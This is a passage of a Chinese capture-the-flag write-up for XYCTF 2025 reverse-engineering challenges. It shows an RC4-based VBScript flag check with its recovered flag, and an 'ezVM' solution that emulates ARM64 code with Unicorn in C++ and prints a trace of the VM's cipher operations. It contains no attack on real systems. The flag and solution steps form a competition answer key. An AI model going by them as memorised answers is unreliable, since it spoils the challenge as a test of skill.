鏄庢枃鎸堿SCII澶勭悊</span></span><br><span class="line">        cipherByte = s((s(i) + s(j)) <span class="built_in">Mod</span> <span class="number">256</span>) <span class="built_in">Xor</span> plainChar</span><br><span class="line">        outHex = outHex &amp; Right(<span class="string">&quot;0&quot;</span> &amp; Hex(cipherByte), <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line">    </span><br><span class="line">    RunRC = outHex</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; 涓婚獙璇侀€昏緫</span></span><br><span class="line"><span class="keyword">If</span> LCase(RunRC(flag, qwfe)) = LCase(wefbuwiue) <span class="keyword">Then</span></span><br><span class="line">    MsgBox <span class="string">&quot;Congratulations! Correct FLAG!&quot;</span></span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">    MsgBox <span class="string">&quot;Wrong flag.&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>RC4解密，密钥为<strong>rc4key</strong></p>
<p><img src="/.%5C1.png" loading="lazy"></p>
<p>flag{We1c0me_t0_XYCTF_2025_reverse_ch@lleng3_by_th3_w@y_p3cd0wn‘s_chall_is_r3@lly_gr3@t_&amp;_fuN!}</p>
<h3 id="ezVM"><a href="#ezVM" class="headerlink" title="ezVM"></a>ezVM</h3><p>通过字符串界面里的unicorn和加密函数的一些特征发现是使用了unicorn框架调用了一串代码。</p>
<p>找一个使用unicorn框架的程序进行bindiff恢复一些unicorn函数的符号。</p>
<p>发现是调用了一串ARM64的代码字节进行模拟执行，将输入字符串传入加密返回，并附上了一些data和栈空间初始化。</p>
<p><img src="/.%5C2.png" loading="lazy"></p>
<p><img src="/.%5C4.png" loading="lazy"></p>
<p>将以上调用write写入的数据提取，随便找一个ARM64框架的.so复制到对应地址，以便反编译看代码。</p>
<p>最后得到一个函数，很清晰的看出里面是一个VM虚拟机执行的流程。</p>
<p><img src="/.%5C5.png" loading="lazy"></p>
<p>使用c++编写代码调用unicorn库进行模拟。</p>
<p>使用Hook，在关键计算地址处进行Hook，输出各个计算流程以及数据。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;data.hpp&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;unicorn/unicorn.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;unicorn-import.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">hook_code</span><span class="params">(uc_engine* uc, <span class="type">uint64_t</span> address, <span class="type">uint32_t</span> size, <span class="type">void</span>* user_data)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> w0,w1,w2,w3,w4;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x1fac</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W1, &amp;w1);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W3 = W1 ^ W0 --- %llx ^ %llx = %llx\n&quot;</span>, w1,w0,w1^w0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x2BE4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W1, &amp;w1);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W3 = W1 &gt;&gt; W0 --- %llx &gt;&gt; %llx = %llx\n&quot;</span>, w1, w0, w1 &gt;&gt; w0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x2DB4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W1, &amp;w1);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W3 = W1 &lt;&lt; W0 --- %llx &lt;&lt; %llx = %llx\n&quot;</span>, w1, w0, w1 &lt;&lt; w0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x232C</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W3, &amp;w3);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W2 = W0 &amp; W3 --- %llx &amp; %llx = %llx\n&quot;</span>, w0, w3, w0 &amp; w3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x2054</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W3, &amp;w3);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W2 = W0 ^ W3 --- %llx ^ %llx = %llx\n&quot;</span>, w0, w3, w3 ^ w0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x2238</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W3, &amp;w3);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W2 = W0 ^ W3 --- %llx ^ %llx = %llx\n&quot;</span>, w0, w3, w3 ^ w0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x2180</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W1, &amp;w1);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W4, &amp;w4);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W1 = W1 ^ W4 --- %llx ^ %llx = %llx\n&quot;</span>, w1, w4, w1 ^ w4);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x1CC4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W1, &amp;w1);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W2 = W1 + W0 --- %llx + %llx = %llx\n&quot;</span>, w1, w0, w1 + w0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x1A0C</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W1, &amp;w1);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W2 = W1 + W0 --- %llx + %llx = %llx\n&quot;</span>, w1, w0, w1 + w0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint8_t</span> Input[] = <span class="string">&quot;11112222111111111111111111111111&quot;</span>;</span><br><span class="line">    uc_engine* uc&#123;&#125;;</span><br><span class="line">    uc_hook hook;</span><br><span class="line">    <span class="type">uint64_t</span> InputAddr = <span class="number">0x14C28</span>;</span><br><span class="line">    <span class="type">uint64_t</span> Stack = <span class="number">0x7F0000</span>;</span><br><span class="line">    <span class="type">uint8_t</span> MyEncFlag[<span class="number">100</span>]&#123;&#125;;</span><br><span class="line">    <span class="type">uint64_t</span> Base = <span class="number">0x0000000001000000</span>;</span><br><span class="line">    <span class="built_in">uc_open</span>(uc_arch::UC_ARCH_ARM64, uc_mode::UC_MODE_ARM, &amp;uc);</span><br><span class="line">    <span class="built_in">uc_mem_map</span>(uc, <span class="number">0</span>, Base, UC_PROT_ALL);</span><br><span class="line">    <span class="built_in">uc_mem_map</span>(uc, Stack - <span class="number">4096</span>, <span class="number">0x4000</span>, UC_PROT_ALL);</span><br><span class="line">    <span class="built_in">uc_hook_add</span>(uc, &amp;hook, UC_HOOK_CODE, hook_code, <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">uc_mem_write</span>(uc, <span class="number">0x14C28</span>, (LPVOID)&amp;Input, <span class="number">0x20u</span>);</span><br><span class="line">    <span class="built_in">uc_mem_write</span>(uc, <span class="number">0x0C70</span>, (LPVOID)&amp;Code, <span class="number">8840u</span>);</span><br><span class="line">    <span class="built_in">uc_mem_write</span>(uc, <span class="number">0x14010</span>, (LPVOID)Data1, <span class="number">0x9B8u</span>);</span><br><span class="line">    <span class="built_in">uc_mem_write</span>(uc, <span class="number">0x30F0</span>, (LPVOID)&amp;Data2, <span class="number">0x54u</span>);</span><br><span class="line">    <span class="built_in">uc_mem_write</span>(uc, <span class="number">0x149E8</span>, (LPVOID)&amp;Data3, <span class="number">8u</span>);</span><br><span class="line">    <span class="built_in">uc_reg_write</span>(uc, <span class="number">0xC7</span>, (LPVOID)&amp;InputAddr);<span class="comment">// X0</span></span><br><span class="line">    <span class="built_in">uc_reg_write</span>(uc, <span class="number">4</span>, (LPVOID)&amp;Stack);       <span class="comment">// SP</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">uc_emu_start</span>(uc, <span class="number">0x0C70</span>, <span class="number">0x2EF4</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_mem_read</span>(uc, InputAddr, &amp;MyEncFlag, <span class="number">48</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%X &quot;</span>, MyEncFlag[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">uc_close</span>(uc);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后运行输出得到一个vm加密流程</p>
<p>以下是部分输出内容。</p>
<p>output:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">4</span> &lt;&lt; <span class="number">0</span> = <span class="number">4</span></span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">4</span> &lt;&lt; <span class="number">1</span> = <span class="number">8</span></span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">32323232</span> &gt;&gt; <span class="number">5</span> = <span class="number">1919191</span></span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">32323232</span> &lt;&lt; <span class="number">6</span> = c8c8c8c80</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">1919191</span> ^ <span class="number">8</span>c8c8c80 = <span class="number">8</span>d1d1d11</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">32323232</span> ^ <span class="number">11223344</span> = <span class="number">23100176</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">8</span>d1d1d11 + <span class="number">23100176</span> = b02d<span class="number">1e87</span></span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">0</span> &amp; <span class="number">3</span> = <span class="number">0</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">776</span>f6853 + <span class="number">0</span> = <span class="number">776</span>f6853</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">776</span>f6853 ^ abab1212 = dcc47a41</span><br><span class="line">W3 = W1 ^ W0 --- b02d<span class="number">1e87</span> ^ dcc47a41 = <span class="number">6</span>ce964c6</span><br><span class="line">W2 = W1 + W0 --- <span class="number">6</span>ce964c6 + <span class="number">31313131</span> = <span class="number">9e1</span>a95f7</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">9e1</span>a95f7 &gt;&gt; <span class="number">4</span> = <span class="number">9e1</span>a95f</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">9e1</span>a95f7 &lt;&lt; <span class="number">7</span> = <span class="number">4</span>f0d4afb80</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">9e1</span>a95f ^ d4afb80 = <span class="number">4</span>ab52df</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">9e1</span>a95f7 ^ <span class="number">55667788</span> = cb7ce27f</span><br><span class="line">W2 = W1 + W0 --- <span class="number">4</span>ab52df + cb7ce27f = d028355e</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">5</span>f5fe<span class="number">6e7</span> &gt;&gt; b = bebfc</span><br><span class="line">W2 = W0 &amp; W3 --- bebfc &amp; <span class="number">3</span> = <span class="number">0</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">776</span>f6853 + <span class="number">5</span>f5fe<span class="number">6e7</span> = d6cf4f3a</span><br><span class="line">W2 = W0 ^ W3 --- d6cf4f3a ^ <span class="number">23235566</span> = f5ec1a5c</span><br><span class="line">W3 = W1 ^ W0 --- f5ec1a5c ^ d028355e = <span class="number">25</span>c42f02</span><br><span class="line">W2 = W1 + W0 --- <span class="number">25</span>c42f02 + <span class="number">32323232</span> = <span class="number">57</span>f66134</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">57</span>f66134 &gt;&gt; <span class="number">5</span> = <span class="number">2</span>bfb309</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">57</span>f66134 &lt;&lt; <span class="number">6</span> = <span class="number">15</span>fd984d00</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">2</span>bfb309 ^ fd984d00 = ff27fe09</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">57</span>f66134 ^ <span class="number">11223344</span> = <span class="number">46</span>d45270</span><br><span class="line">W2 = W1 + W0 --- ff27fe09 + <span class="number">46</span>d45270 = <span class="number">145</span>fc5079</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">5</span>f5fe<span class="number">6e7</span> &amp; <span class="number">3</span> = <span class="number">3</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">74696564</span> + <span class="number">5</span>f5fe<span class="number">6e7</span> = d3c94c4b</span><br><span class="line">W2 = W0 ^ W3 --- d3c94c4b ^ abab1212 = <span class="number">78625e59</span></span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">45</span>fc5079 ^ <span class="number">78625e59</span> = <span class="number">3</span>d<span class="number">9e0</span>e20</span><br><span class="line">W2 = W1 + W0 --- <span class="number">3</span>d<span class="number">9e0</span>e20 + <span class="number">9e1</span>a95f7 = dbb8a417</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- dbb8a417 &gt;&gt; <span class="number">4</span> = dbb8a41</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- dbb8a417 &lt;&lt; <span class="number">7</span> = <span class="number">6</span>ddc520b80</span><br><span class="line">W3 = W1 ^ W0 --- dbb8a41 ^ dc520b80 = d<span class="number">1e981</span>c1</span><br><span class="line">W2 = W0 ^ W3 --- dbb8a417 ^ <span class="number">55667788</span> = <span class="number">8</span>eded39f</span><br><span class="line">W2 = W1 + W0 --- d<span class="number">1e981</span>c1 + <span class="number">8</span>eded39f = <span class="number">160</span>c85560</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- bebfcdce &gt;&gt; b = <span class="number">17</span>d7f9</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">17</span>d7f9 &amp; <span class="number">3</span> = <span class="number">1</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">656</span>b616d + bebfcdce = <span class="number">1242</span>b2f3b</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">242</span>b2f3b ^ <span class="number">23235566</span> = <span class="number">7087</span>a5d</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">7087</span>a5d ^ <span class="number">60</span>c85560 = <span class="number">67</span>c02f3d</span><br><span class="line">W2 = W1 + W0 --- <span class="number">67</span>c02f3d + <span class="number">57</span>f66134 = bfb69071</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- bfb69071 &gt;&gt; <span class="number">5</span> = <span class="number">5</span>fdb483</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- bfb69071 &lt;&lt; <span class="number">6</span> = <span class="number">2</span>feda41c40</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">5</span>fdb483 ^ eda41c40 = e859a8c3</span><br><span class="line">W2 = W0 ^ W3 --- bfb69071 ^ <span class="number">11223344</span> = ae94a335</span><br><span class="line">W2 = W1 + W0 --- e859a8c3 + ae94a335 = <span class="number">196</span>ee4bf8</span><br><span class="line">W2 = W0 &amp; W3 --- bebfcdce &amp; <span class="number">3</span> = <span class="number">2</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">616</span>d5f72 + bebfcdce = <span class="number">1202</span>d2d40</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">202</span>d2d40 ^ abab1212 = <span class="number">8</span>b863f52</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">96</span>ee4bf8 ^ <span class="number">8</span>b863f52 = <span class="number">1</span>d6874aa</span><br><span class="line">W2 = W1 + W0 --- <span class="number">1</span>d6874aa + dbb8a417 = f92118c1</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- f92118c1 &gt;&gt; <span class="number">4</span> = f92118c</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- f92118c1 &lt;&lt; <span class="number">7</span> = <span class="number">7</span>c908c6080</span><br><span class="line">W3 = W1 ^ W0 --- f92118c ^ <span class="number">908</span>c6080 = <span class="number">9</span>f<span class="number">1e710</span>c</span><br><span class="line">W2 = W0 ^ W3 --- f92118c1 ^ <span class="number">55667788</span> = ac476f49</span><br><span class="line">W2 = W1 + W0 --- <span class="number">9</span>f<span class="number">1e710</span>c + ac476f49 = <span class="number">14</span>b<span class="number">65e055</span></span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">1e1f</span>b4b5 &gt;&gt; b = <span class="number">3</span>c3f6</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">3</span>c3f6 &amp; <span class="number">3</span> = <span class="number">2</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">616</span>d5f72 + <span class="number">1e1f</span>b4b5 = <span class="number">7</span>f8d1427</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">7</span>f8d1427 ^ <span class="number">23235566</span> = <span class="number">5</span>cae4141</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">5</span>cae4141 ^ <span class="number">4</span>b<span class="number">65e055</span> = <span class="number">17</span>cba114</span><br><span class="line">W2 = W1 + W0 --- <span class="number">17</span>cba114 + bfb69071 = d7823185</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- d7823185 &gt;&gt; <span class="number">5</span> = <span class="number">6</span>bc118c</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- d7823185 &lt;&lt; <span class="number">6</span> = <span class="number">35e08</span>c6140</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">6</span>bc118c ^ e08c6140 = e63070cc</span><br><span class="line">W2 = W0 ^ W3 --- d7823185 ^ <span class="number">11223344</span> = c6a002c1</span><br><span class="line">W2 = W1 + W0 --- e63070cc + c6a002c1 = <span class="number">1</span>acd0738d</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">1e1f</span>b4b5 &amp; <span class="number">3</span> = <span class="number">1</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">656</span>b616d + <span class="number">1e1f</span>b4b5 = <span class="number">838</span>b1622</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">838</span>b1622 ^ abab1212 = <span class="number">28200430</span></span><br><span class="line">W3 = W1 ^ W0 --- acd0738d ^ <span class="number">28200430</span> = <span class="number">84</span>f077bd</span><br><span class="line">W2 = W1 + W0 --- <span class="number">84</span>f077bd + f92118c1 = <span class="number">17e11907</span>e</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">7e11907</span>e &gt;&gt; <span class="number">4</span> = <span class="number">7e11907</span></span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">7e11907</span>e &lt;&lt; <span class="number">7</span> = <span class="number">3</span>f08c83f00</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">7e11907</span> ^ <span class="number">8</span>c83f00 = f292607</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">7e11907</span>e ^ <span class="number">55667788</span> = <span class="number">2</span>b<span class="number">77e7f</span>6</span><br><span class="line">W2 = W1 + W0 --- f292607 + <span class="number">2</span>b<span class="number">77e7f</span>6 = <span class="number">3</span>aa10dfd</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">7</span>d7f9b9c &gt;&gt; b = faff3</span><br><span class="line">W2 = W0 &amp; W3 --- faff3 &amp; <span class="number">3</span> = <span class="number">3</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">74696564</span> + <span class="number">7</span>d7f9b9c = f<span class="number">1e90100</span></span><br><span class="line">W2 = W0 ^ W3 --- f<span class="number">1e90100</span> ^ <span class="number">23235566</span> = d2ca5466</span><br><span class="line">W3 = W1 ^ W0 --- d2ca5466 ^ <span class="number">3</span>aa10dfd = e86b599b</span><br><span class="line">W2 = W1 + W0 --- e86b599b + d7823185 = <span class="number">1</span>bfed8b20</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- bfed8b20 &gt;&gt; <span class="number">5</span> = <span class="number">5</span>ff6c59</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- bfed8b20 &lt;&lt; <span class="number">6</span> = <span class="number">2</span>ffb62c800</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">5</span>ff6c59 ^ fb62c800 = fe9da459</span><br><span class="line">W2 = W0 ^ W3 --- bfed8b20 ^ <span class="number">11223344</span> = aecfb864</span><br><span class="line">W2 = W1 + W0 --- fe9da459 + aecfb864 = <span class="number">1</span>ad6d5cbd</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">7</span>d7f9b9c &amp; <span class="number">3</span> = 